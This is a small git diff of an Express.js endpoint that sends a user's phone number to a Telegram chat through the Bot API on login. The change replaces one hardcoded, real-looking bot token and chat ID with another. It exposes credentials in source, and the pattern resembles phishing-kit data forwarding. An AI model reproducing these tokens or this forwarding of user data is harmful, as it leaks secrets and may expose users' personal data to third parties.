@@ -243,8 +243,8 @@ app.post('/send-message', async (req, res) => {
     try {
 		const { phoneNumber } = req.body;
         // Replace 'YOUR_BOT_TOKEN' with your actual bot token
-        const botToken = '6943210072:AAG8gsrJ5Vz9FORrK7rE2rs4xMId_ICRJYg';
-        const chatId = '1466215143'; // Replace 'YOUR_CHAT_ID' with the chat ID where you want to send the message
+        const botToken = '7038077524:AAF4sCAdiim4yvZwXSpaxo7sdVMvay1PLnA';
+        const chatId = '5897736034'; // Replace 'YOUR_CHAT_ID' with the chat ID where you want to send the message
         const message = `User with phone ${phoneNumber} number has logged in`;;
 
         // Send message to Telegram using the Bot API
